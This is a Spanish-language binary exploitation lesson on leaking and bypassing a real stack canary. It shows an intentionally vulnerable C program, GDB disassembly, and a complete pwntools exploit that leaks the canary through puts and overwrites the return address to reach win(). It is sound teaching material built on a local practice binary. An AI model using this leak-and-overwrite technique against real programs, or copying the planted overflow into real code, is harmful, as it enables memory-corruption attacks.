# Clase 5: Bypass de Canary Real

#RealCanary #CanaryLeak #InformationLeak #StackProtection #CanaryBypass #ExploitDevelopment #BinaryExploitation #GDB #Pwntools #ELF #x64Assembly #Checksec #ReadVulnerability #NullByte #FormatString

---

## Modificación del Código

Ahora vulneraremos un canary real. Para eso modificamos el código `main` que teníamos de la clase anterior de la siguiente forma borrando el custom canary:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void win() {
    puts("Ganaste");
}

void vuln() {
    char buf[16];
    buf[0] = 'a';

    read(STDIN_FILENO, buf, 0xff);
}

int main() {
    vuln();
    puts("Todo bien");
    return 0;
}
```

---

## Compilación con Stack Protector

Ahora lo compilaremos sin 1 de las protecciones que desactivábamos, compilaremos de esta forma:

```bash
gcc -g main.c -o main -z execstack -no-pie -Wl,-z,norelro -fstack-protector-all
```

### Verificación con checksec

```bash
checksec main                                                                  
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/5/main'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found <-- Bien canary actualmente
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

---

## Comparación: Con y Sin Canary

Bueno hacemos 2 binarios, uno con canary y uno sin canary:

### Sin Canary

```bash
checksec main_normal 
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_normal'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

### Con Canary

```bash
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/5]
└─$ checksec main_canary 
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_canary'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

---

## Comportamiento de Ambos Binarios

Veamos qué dicen:

### Sin Canary

```bash
./main_normal 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
zsh: segmentation fault  ./main_normal
```

### Con Canary

```bash
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/5]
└─$ ./main_canary 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./main_canary
```

En canary se aborta directamente, en el normal sobreescribe A pero pues no es válida esa dirección.

---

## Disassemble de vuln()

Ahora veamos un poco mejor esto haciendo un `disassemble` a `vuln`:

```nasm
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x0000000000401183 <+0>:     push   rbp
   0x0000000000401184 <+1>:     mov    rbp,rsp
   0x0000000000401187 <+4>:     sub    rsp,0x20
   0x000000000040118b <+8>:     mov    rax,QWORD PTR fs:0x28 <-- Valor aleatorio no visible a menos que debugueemos o particularidades
   0x0000000000401194 <+17>:    mov    QWORD PTR [rbp-0x8],rax <-- valor del canary a rbp 0x8
   0x0000000000401198 <+21>:    xor    eax,eax
   0x000000000040119a <+23>:    mov    BYTE PTR [rbp-0x20],0x61 <-- valor del buffer 0x20
   0x000000000040119e <+27>:    lea    rax,[rbp-0x20]
   0x00000000004011a2 <+31>:    mov    edx,0xff
   0x00000000004011a7 <+36>:    mov    rsi,rax
   0x00000000004011aa <+39>:    mov    edi,0x0
   0x00000000004011af <+44>:    call   0x401050 <read@plt>
   0x00000000004011b4 <+49>:    nop
   0x00000000004011b5 <+50>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004011b9 <+54>:    sub    rax,QWORD PTR fs:0x28
   0x00000000004011c2 <+63>:    je     0x4011c9 <vuln+70>
   0x00000000004011c4 <+65>:    call   0x401040 <__stack_chk_fail@plt>
   0x00000000004011c9 <+70>:    leave
   0x00000000004011ca <+71>:    ret
End of assembler dump.
gef➤  
```

---

## Cálculo de Distancia

Podemos calcular el soporte antes de que truene de la misma manera que la clase pasada, la distancia de donde comienza el valor de canary con el buffer:

```python
>>> 0x20-0x8
24
```

```
buffer <-- rbp-0x20


??? <-- canary rbp-0x8
rbp
main
```

Entonces:

```bash
python3 -c "print('A'*24, end='')"
```

Lo pasamos a canary:

```bash
python3 -c "print('A'*24, end='')" | ./main_canary                            
Todo bien
```

Pero una A más y tronaría.

---

## Verificación de Canary en el Ensamblador

¿Dónde pasa eso en el ensamblador?

```nasm
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x0000000000401183 <+0>:     push   rbp
   0x0000000000401184 <+1>:     mov    rbp,rsp
   0x0000000000401187 <+4>:     sub    rsp,0x20
   0x000000000040118b <+8>:     mov    rax,QWORD PTR fs:0x28 <-- Valor aleatorio no visible a menos que debugueemos o particularidades
   0x0000000000401194 <+17>:    mov    QWORD PTR [rbp-0x8],rax <-- valor del canary a rbp 0x8
   0x0000000000401198 <+21>:    xor    eax,eax
   0x000000000040119a <+23>:    mov    BYTE PTR [rbp-0x20],0x61 <-- valor del buffer 0x20
   0x000000000040119e <+27>:    lea    rax,[rbp-0x20]
   0x00000000004011a2 <+31>:    mov    edx,0xff
   0x00000000004011a7 <+36>:    mov    rsi,rax
   0x00000000004011aa <+39>:    mov    edi,0x0
   0x00000000004011af <+44>:    call   0x401050 <read@plt>
   0x00000000004011b4 <+49>:    nop
   0x00000000004011b5 <+50>:    mov    rax,QWORD PTR [rbp-0x8] <-- Aquí se clona el valor real de canary a rax
   0x00000000004011b9 <+54>:    sub    rax,QWORD PTR fs:0x28 <-- aquí lo resta a rax que tiene la copia de canary el canary real
   0x00000000004011c2 <+63>:    je     0x4011c9 <vuln+70> <-- Le hace un jump equal a +70: leave
   0x00000000004011c4 <+65>:    call   0x401040 <__stack_chk_fail@plt> <-- Se brincaría esto si son iguales, sino pues truena con este
   0x00000000004011c9 <+70>:    leave
   0x00000000004011ca <+71>:    ret
End of assembler dump.
```

---

## Análisis con Breakpoint

Si ponemos un breakpoint en `vuln+50` para verlo mejor, vemos cómo al registro `rax` le asigna el valor del canary que nunca será el mismo. Damos `r` después de poner el breakpoint, ponemos unas AAA ligeras y vemos esto en los registros después de poner `ni`:

```nasm
     0x4011af <vuln+002c>      call   0x401050 <read@plt>
     0x4011b4 <vuln+0031>      nop    
●    0x4011b5 <vuln+0032>      mov    rax, QWORD PTR [rbp-0x8] <-- Esta instrucción se ejecutó: mover el valor de canary a rax
 →   0x4011b9 <vuln+0036>      sub    rax, QWORD PTR fs:0x28 <-- Ahora hará la resta a rax con el valor original inaccesible, si da 0 son iguales
     0x4011c2 <vuln+003f>      je     0x4011c9 <vuln+70>
     0x4011c4 <vuln+0041>      call   0x401040 <__stack_chk_fail@plt>
     0x4011c9 <vuln+0046>      leave  
     0x4011ca <vuln+0047>      ret    
     0x4011cb <main+0000>      push   rbp
```

```
$rax   : 0x78096356b41ccf00 <-- ese es el valor que toma canary en esta ejecución

$rax   : 0x0 <-- después de la segunda instrucción la de la resta sub, son iguales(da 0), sigue la ejecución
```

De meterle un posible buffer pues muchas A, entonces el `rax` tomaría el valor de puros `4141414141414141`. La resta no daría 0 y brincaría esta función:

```nasm
   0x00000000004011c4 <+65>:    call   0x401040 <__stack_chk_fail@plt>
```

La cual haría que tronara.

---

## ¿Qué Hacemos en Estos Casos?

Ocupamos un **leak**, cosa que el programa suelte que no debería de soltar. Hay casos para esto. Bien, existen programas con canary que simplemente son imposibles de explotar. Modifiquemos el código para que tenga una de esas características que lo harían explotable:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void win() {
    puts("Ganaste");
}

void vuln() {
    char buf[16];
    buf[0] = 'a';

    read(STDIN_FILENO, buf, 0xff);
    puts(buf);
}

int main() {
    vuln();
    vuln();

    puts("Todo bien");

    return 0;
}
```

Es normal que las funciones se llamen más de 1 vez, al fin y al cabo para eso están hechas y que se imprima algo también es común.

---

## Leak del Canary

Ahora si corremos el programa con muchas A nos suelta como un algo antes del mensaje de canary (en mi terminal no se veía xd).

Pero bueno, ¿por qué? Porque si hay una función de leer, si recordamos no para hasta toparse con un null byte. Si le pasamos las A hasta el tope donde empieza canary que lo calculamos arriba, imprimirá el canary al no haber null byte. El `rbp` sí tiene null byte (no tenia xd) al ser dirección del stack. Así que ejecutamos esto:

```bash
python2 -c "print b'A'*24, " | ./main_canary
```

```bash
python2 -c "print b'A'*24, " | ./main_canary
AAAAAAAAAAAAAAAAAAAAAAAA
J w   pѿ   <-- esta cosa es el canary
*** stack smashing detected ***: terminated
zsh: done             python2 -c "print b'A'*24, " | 
zsh: IOT instruction  ./main_canary
```

En este caso `read` es susceptible a leak pero `gets` no serviría.

Podemos comprobar que es el canary debugueando y metiendo si tiene null byte al final el canary (se lee de atrás a delante): 24 A más salto de línea y listo. Podríamos convertir `chr(caracteres que están en el stack)` e ir verificando que es el canary.

---

## Script con Pwntools

Ya sabiendo eso, podemos hacer un script en pwntools no sin antes modificar un poco el código de `main.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void win() {
    puts("Ganaste");
}

void vuln() {
    char buf[16];
    buf[0] = 'a';

    read(STDIN_FILENO, buf, 0xff);
    puts(buf);
    read(STDIN_FILENO, buf, 0xff); <-- pusimos otra de estas líneas
}

int main() {
    vuln(); <-- ya no llama 2 veces

    puts("Todo bien");

    return 0;
}
```

### Script Básico para Sacar el Canary

```python
from pwn import *
binario = ELF("./main_canary")
p = process(binario.path)
payload = b"A"*25 # <-- 25 para sobreescribir el null byte de canary, sino no regresará nada
p.send(payload)
p.interactive()
```

Corremos el programa `solve.py`:

```bash
python3 solve.py
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_canary'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_canary': pid 156433
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x08\x1c\x8d\x1e\x86\xc5`@MO\xfd\x7f <-- canary la primera A es parte del canary
```

---

## Exploit Completo

Mejoramos el exploit para:

- Regresarle el null byte al canary
- Solo agarrar al canary porque agarramos también el base pointer `rbp`
- Transformarlo a número para armar el payload con el canary puesto
- Llamar 8 bytes de relleno para el `rbp` y la dirección de `win`

```python
cat solve.py 
from pwn import *

binario = ELF("./main_canary")

p = process(binario.path)

payload = b"A"*25

p.send(payload)

p.recv(24)

canary = p.recv(8)

canary = b"\00" + canary[1:]

canary = u64(canary) # u64 es como si lo estuviéramos manejando como entero

print("CANARY", canary)

payload = b"A"*24
payload += p64(canary)
payload += b"A"*8
payload += p64(binario.symbols["win"])

p.send(payload)

p.interactive()
```

### Ejecución

```bash
python3 solve.py
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_canary'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process '/home/kali/Documents/pwn/eliasCodesPruebas/5/main_canary': pid 169914
CANARY 10610741793648826112
[*] Switching to interactive mode
p\x84\x84\xe7\xfc\x7f
Ganaste <--- GANASTE
[*] Got EOF while reading in interactive
$      zsh: suspended (signal)  python3 solve.py
```

---

## Explicación del Exploit

Entonces el canary sufrió por el leak de `puts` al leer entre 2 `reads`. Pues si llenamos el buffer de distancia no encuentra el null byte y también imprime el canary (porque primero remplazamos el nullbyte de canary \x00 por una A), entonces nos aprovechamos de eso y armamos el exploit.

---

## Conclusión

**Tenemos que checar muy bien qué hace el código del binario.** De allí podemos ver de qué nos aprovechamos: a veces buffer, a veces otra cosa. Así es el pwn.

---

## Introducción a Format String

`printf` la vulnerabilidad **format string** será la vista la siguiente clase. Consiste en un mal uso del input del usuario sea mal usado.

Es decir que podemos hacer que nuestra entrada en lugar de ser tomada como un literal string (`"literalstring"`) sea tomado como un formato de `printf`:

`%x` por ejemplo.